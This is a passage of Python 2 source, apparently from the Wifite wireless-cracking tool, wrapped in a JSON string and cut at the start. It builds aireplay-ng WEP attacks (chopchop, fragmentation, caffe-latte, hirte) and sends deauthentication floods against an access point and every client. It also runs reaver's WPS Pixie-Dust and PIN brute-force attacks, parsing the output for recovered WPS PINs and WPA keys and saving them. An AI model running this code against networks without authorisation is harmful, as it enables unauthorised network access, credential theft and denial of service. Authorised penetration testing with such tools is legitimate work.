'--ignore-negative-one',\n                   '--chopchop',\n                   '-b', target.bssid,\n                   '-x', str(self.RUN_CONFIG.WEP_PPS),  # Packets per second\n                   '-m', '60',  # Minimum packet length (bytes)\n                   '-n', '82',  # Maxmimum packet length\n                   '-F']  # Automatically choose the first packet\n            if client_mac != '':\n                cmd.append('-h')\n                cmd.append(client_mac)\n            elif len(clients) > 0:\n                cmd.append('-h')\n                cmd.append(clients[0].bssid)\n            cmd.append(iface)\n\n        elif attack_num == 2:\n            cmd = ['aireplay-ng',\n                   '--ignore-negative-one',\n                   '--fragment',\n                   '-b', target.bssid,\n                   '-x', str(self.RUN_CONFIG.WEP_PPS),  # Packets per second\n                   '-m', '100',  # Minimum packet length (bytes)\n                   '-F']  # Automatically choose the first packet\n            if client_mac != '':\n                cmd.append('-h')\n                cmd.append(client_mac)\n            elif len(clients) > 0:\n                cmd.append('-h')\n                cmd.append(clients[0].bssid)\n            cmd.append(iface)\n\n        elif attack_num == 3:\n            cmd = ['aireplay-ng',\n                   '--ignore-negative-one',\n                   '--caffe-latte',\n                   '-b', target.bssid]\n            if len(clients) > 0:\n                cmd.append('-h')\n                cmd.append(clients[0].bssid)\n            cmd.append(iface)\n\n        elif attack_num == 4:\n            cmd = ['aireplay-ng', '--ignore-negative-one', '--interactive', '-b', target.bssid, '-c',\n                   'ff:ff:ff:ff:ff:ff', '-t', '1', '-x', str(self.RUN_CONFIG.WEP_PPS), '-F', '-p', '0841', iface]\n\n        elif attack_num == 5:\n            if len(clients) == 0:\n                print R + ' [0:00:00] unable to carry out hirte attack: ' + O + 'no clients'\n                return ''\n            cmd = ['aireplay-ng',\n                   '--ignore-negative-one',\n                   '--cfrag',\n                   '-h', clients[0].bssid,\n                   iface]\n\n        return cmd\n\n    def wep_send_deauths(self, iface, target, clients):\n        \"\"\"\n            Sends deauth packets to broadcast and every client.\n        \"\"\"\n        # Send deauth to broadcast\n        cmd = ['aireplay-ng',\n               '--ignore-negative-one',\n               '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),\n               '-a', target.bssid,\n               iface]\n        call(cmd, stdout=DN, stderr=DN)\n        # Send deauth to every client\n        for client in clients:\n            cmd = ['aireplay-ng',\n                   '--ignore-negative-one',\n                   '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),\n                   '-a', target.bssid,\n                   '-c', client.bssid,\n                   iface]\n            call(cmd, stdout=DN, stderr=DN)\n\n\n#################\n# WPS FUNCTIONS #\n#################\nclass WPSAttack(Attack):\n    def __init__(self, iface, target, config):\n        self.iface = iface\n        self.target = target\n        self.RUN_CONFIG = config\n\n    def RunAttack(self):\n        '''\n            Abstract method for initializing the WPS attack\n        '''\n        if self.is_pixie_supported():\n            # Try the pixie-dust attack\n            if self.attack_wps_pixie():\n                # If it succeeds, stop\n                return True\n\n        # Drop out if user specified to run ONLY the pixie attack\n        if self.RUN_CONFIG.PIXIE:\n            return False\n\n        # Try the WPS PIN attack\n        return self.attack_wps()\n\n    def EndAttack(self):\n        '''\n            Abstract method for ending the WPS attack\n        '''\n        pass\n\n    def is_pixie_supported(self):\n        '''\n            Checks if current version of Reaver supports the pixie-dust attack\n        '''\n        p = Popen(['reaver', '-h'], stdout=DN, stderr=PIPE)\n        stdout = p.communicate()[1]\n        for line in stdout.split('\\n'):\n            if '--pixie-dust' in line:\n                return True\n        return False\n\n    def attack_wps_pixie(self):\n        \"\"\"\n            Attempts \"Pixie WPS\" attack which certain vendors\n            susceptible to.\n        \"\"\"\n\n        # TODO Check if the user's version of reaver supports the Pixie attack (1.5.2+, \"mod by t6_x\")\n        #      If not, return False\n\n        output_file = os.path.join(self.RUN_CONFIG.temp, 'out.out')\n        pixie_file = os.path.join(self.RUN_CONFIG.temp, 'pixie.out')\n\n        print GR + ' [0:00:00]' + W + ' initializing %sWPS Pixie attack%s on %s' % \\\n                                      (G, W, G + self.target.ssid + W + ' (' + G + self.target.bssid + W + ')' + W)\n        cmd = ['reaver',\n               '-i', self.iface,\n               '-b', self.target.bssid,\n               '-c', self.target.channel,\n               '-K', '1', # Pixie WPS attack\n               '-vv']  # verbose output\n\n        # Redirect output to files\n        outf = open(output_file, 'a')\n        errf = open(pixie_file, 'a')\n\n        # Start process\n        proc = Popen(cmd, stdout=outf, stderr=errf)\n\n        cracked = False  # Flag for when password/pin is found\n        time_started = time.time()\n        pin = ''\n        key = ''\n\n        try:\n            while not cracked:\n                time.sleep(1)\n                errf.flush()\n                if proc.poll() != None:\n                    # Process stopped: Cracked? Failed?\n                    errf.close()\n                    inf = open(output_file, 'r')\n                    lines = inf.read().split('\\n')\n                    inf.close()\n                    for line in lines:\n                        # Cracked: older pixiewps/reaver output\n                        if line.find(\"WPS PIN: '\") != -1:\n                            pin = line[line.find(\"WPS PIN: '\") + 10:-1]\n                            cracked = True\n                        if line.find(\"WPA PSK: '\") != -1:\n                            key = line[line.find(\"WPA PSK: '\") + 10:-1]\n\n                        # Cracked: Newer pixiewps output\n                        if line.find(\"WPS pin:  \") != -1:\n                            pin = line[line.find(\"WPS pin:  \") + 10:]\n                            cracked = True\n                        if line.find(\"WPA PSK:  \") != -1:\n                            key = line[line.find(\"WPA PSK:  \") + 10:]\n\n                        # Failed:\n                        if 'Pixie-Dust' in line and 'WPS pin not found' in line:\n                            # PixieDust isn't possible on this router\n                            print '\\r %s WPS Pixie attack%s failed - WPS pin not found              %s' % (GR + sec_to_hms(time.time() - time_started) + G, R, W)\n                            break\n                    break\n\n                # (Reaver is still running)\n\n                print '\\r %s WPS Pixie attack:' % (GR + sec_to_hms(time.time() - time_started) + G),\n\n                # Check if there's an output file to parse\n                if not os.path.exists(output_file): continue\n                inf = open(output_file, 'r')\n                lines = inf.read().split('\\n')\n                inf.close()\n\n                output_line = ''\n                for line in lines:\n                    line = line.replace('[+]', '').replace('[!]', '').replace('\\0', '').strip()\n                    if line == '' or line == ' ' or line == '\\t': continue\n                    if len(line) > 50:\n                        # Trim to a reasonable size\n                        line = line[0:47] + '...'\n                    output_line = line\n\n                if 'Sending M2 message' in output_line:\n                    # At this point in the Pixie attack, all output is via stderr\n                    # We have to wait for the process to finish to see the result.\n                    print O, 'sending M2 message (may take a while)...                   ', W,\n                elif output_line != '':\n                    # Print the last message from reaver as a \"status update\"\n                    print C, output_line, W, ' ' * (50 - len(output_line)),\n\n                stdout.flush()\n\n                # Clear out output file\n                inf = open(output_file, 'w')\n                inf.close()\n\n            # End of big \"while not cracked\" loop\n            if cracked:\n                if pin != '':\n                    print GR + '\\n\\n [+]' + G + ' PIN found:     %s' % (C + pin + W)\n\n                if key != '':\n                    print GR + ' [+] %sWPA key found:%s %s' % (G, W, C + key + W)\n                else:\n                    key = 'N/A'\n\n                self.RUN_CONFIG.WPA_FINDINGS.append(W + \"found %s's WPA key: \\\"%s\\\", WPS PIN: %s\" % (\n                G + self.target.ssid + W, C + key + W, C + pin + W))\n                self.RUN_CONFIG.WPA_FINDINGS.append('')\n\n                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)\n                t.key = key\n                t.wps = pin\n                self.RUN_CONFIG.save_cracked(t)\n            else:\n                print GR + '\\n [+]' + R + ' Attack failed.' + W\n\n        except KeyboardInterrupt:\n            print R + '\\n (^C)' + O + ' WPS Pixie attack interrupted' + W\n            if attack_interrupted_prompt():\n                send_interrupt(proc)\n                print ''\n                self.RUN_CONFIG.exit_gracefully(0)\n\n        send_interrupt(proc)\n\n        # Delete the files\n        if os.path.exists(output_file): os.remove(output_file)\n        if os.path.exists(pixie_file): os.remove(pixie_file)\n\n        return cracked\n\n\n    def attack_wps(self):\n        \"\"\"\n            Mounts attack against target on iface.\n            Uses \"reaver\" to attempt to brute force the PIN.\n            Once PIN is found, PSK can be recovered.\n            PSK is displayed to user and added to WPS_FINDINGS\n        \"\"\"\n        print GR + ' [0:00:00]' + W + ' initializing %sWPS PIN attack%s on %s' % \\\n                                      (G, W, G + self.target.ssid + W + ' (' + G + self.target.bssid + W + ')' + W)\n\n        output_file = os.path.join(self.RUN_CONFIG.temp, 'out.out')\n        cmd = ['reaver',\n               '-i', self.iface,\n               '-b', self.target.bssid,\n               '-o', output_file,  # Dump output to file to be monitored\n               '-c', self.target.channel,\n               '-vv']  # verbose output\n        proc = Popen(cmd, stdout=DN, stderr=DN)\n\n        cracked = False  # Flag for when password/pin is found\n        percent = 'x.xx%'  # Percentage complete\n        aps = 'x'  # Seconds per attempt\n        time_started = time.time()\n        last_success = time_started  # Time of last successful attempt\n        last_pin = ''  # Keep track of last pin tried (to detect retries)\n        retries = 0  # Number of times we have attempted this PIN\n        tries_total = 0  # Number of times we have attempted all pins\n        tries = 0  # Number of successful attempts\n        pin = ''\n        key = ''\n\n        try:\n            while not cracked:\n                time.sleep(1)\n\n                if not os.path.exists(output_file): continue\n\n                if proc.poll() != None:\n                    # Process stopped: Cracked? Failed?\n                    inf = open(output_file, 'r')\n                    lines = inf.read().split('\\n')\n                    inf.close()\n                    for line in lines:\n                        # When it's cracked:\n                        if line.find(\"WPS PIN: '\") != -1:\n                            pin = line[line.find(\"WPS PIN: '\") + 10:-1]\n                            cracked = True\n                        if line.find(\"WPA PSK: '\") != -1:\n                            key = line[line.find(\"WPA PSK: '\") + 10:-1]\n\n                    break\n\n                inf = open(output_file, 'r')\n                lines = inf.read().split('\\n')\n                inf.close()\n\n                for line in lines:\n                    if line.strip() == '': continue\n                    # Status\n                    if line.find(' complete @ ') != -1 and len(line) > 8:\n                        percent = line.split(' ')[1]\n                        i = line.find(' (')\n                        j = line.find(' seconds/', i)\n                        if i != -1 and j != -1: aps = line[i + 2:j]\n                    # PIN attempt\n                    elif line.find(' Trying pin ') != -1:\n                        pin = line.strip().split(' ')[-1]\n                        if pin == last_pin:\n                            retries += 1\n                        elif tries_total == 0:\n                            last_pin = pin\n                            tries_total -= 1\n                        else:\n                            last_success = time.time()\n                            tries += 1\n                            last_pin = pin\n                            retries = 0\n                        tries_total += 1\n\n                    # Warning\n                    elif line.endswith('10 failed connections in a row'):\n                        pass\n\n                    # Check for PIN/PSK\n                    elif line.find(\"WPS PIN: '\") != -1:\n                        pin = line[line.find(\"WPS PIN: '\") + 10:-1]\n                        cracked = True\n                    elif line.find(\"WPA PSK: '\") != -1:\n                        key = line[line.find(\"WPA PSK: '\") + 10:-1]\n                    if cracked: break\n\n                print ' %s WPS attack, %s success/ttl,' % \\\n                      (GR + sec_to_hms(time.time() - time_started) + W, \\\n                       G + str(tries) + W + '/' + O + str(tries_total) + W),\n\n                if percent == 'x.xx%' and aps == 'x':\n                    print '\\r',\n                else:\n                    print '%s complete (%s sec/att)   \\r' % (G + percent + W, G + aps + W),\n\n                if self.RUN_CONFIG.WPS_TIMEOUT > 0 and (time.time() - last_success) > self.RUN_CONFIG.WPS_TIMEOUT:\n                    print R + '\\n [!]' + O + ' unable to complete successful try in %d seconds' % (\n                    self.RUN_CONFIG.WPS_TIMEOUT)\n                    print R + ' [+]' + W + ' skipping %s' % (O + self.target.ssid + W)\n                    break\n\n                if self.RUN_CONFIG.WPS_MAX_RETRIES > 0 and retries > self.RUN_CONFIG.WPS_MAX_RETRIES:\n                    print R + '\\n [!]' + O + ' unable to complete successful try in %d retries' % (\n                    self.RUN_CONFIG.WPS_MAX_RETRIES)\n                    print R + ' [+]' + O + ' the access point may have WPS-locking enabled, or is too far away' + W\n                    print R + ' [+]' + W + ' skipping %s' % (O + self.target.ssid + W)\n                    break\n\n                if self.RUN_CONFIG.WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (\n                    float(tries) / tries_total) < self.RUN_CONFIG.WPS_RATIO_THRESHOLD:\n                    print R + '\\n [!]' + O + ' successful/total attempts ratio was too low (< %.2f)' % (\n                    self.RUN_CONFIG.WPS_RATIO_THRESHOLD)\n                    print R + ' [+]' + W + ' skipping %s' % (G + self.target.ssid + W)\n                    break\n\n                stdout.flush()\n                # Clear out output file if bigger than 1mb\n                inf = open(output_file, 'w')\n                inf.close()\n\n            # End of big \"while not cracked\" loop\n\n            if cracked:\n                if pin != '':\n                    print GR + '\\n\\n [+]' + G + ' PIN found:     %s' % (C + pin + W)\n                if key != '':\n                    print GR + ' [+] %sWPA key found:%s %s' % (G, W, C + key + W)\n                else:\n                    key = 'N/A'\n                self.RUN_CONFIG.WPA_FINDINGS.append(W + \"found %s's WPA key: \\\"%s\\\", WPS PIN: %s\" % (\n                G + self.target.ssid + W, C + key + W, C + pin + W))\n                self.RUN_CONFIG.WPA_FINDINGS.append('')\n\n                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)\n                t.key = key\n                t.wps = pin\n                self.RUN_CONFIG.save_cracked(t)\n\n        except KeyboardInterrupt:\n            print R + '\\n (^C)' + O + ' WPS brute-force attack interrupted' + W\n            if attack_interrupted_prompt():\n                send_interrupt(proc)\n                print ''\n                self.RUN_CONFIG.exit_gracefully(0)\n\n        send_interrupt(proc)\n\n        return cracked\n\n\nif __name__ == '__main__':\n    RUN_CONFIG = RunConfiguration()\n    try:\n        banner(RUN_CONFIG)\n        engine = RunEngine(RUN_CONFIG)\n        engine.Start()\n        #main(RUN_CONFIG)\n    except KeyboardInterrupt:\n        print R + '\\n (^C)' + O + ' interrupted\\n' + W\n    except EOFError:\n        print R + '\\n (^D)' + O + ' interrupted\\n' + W\n\n    RUN_CONFIG.exit_gracefully(0)\n"
        }
      ]
    }
  ]
}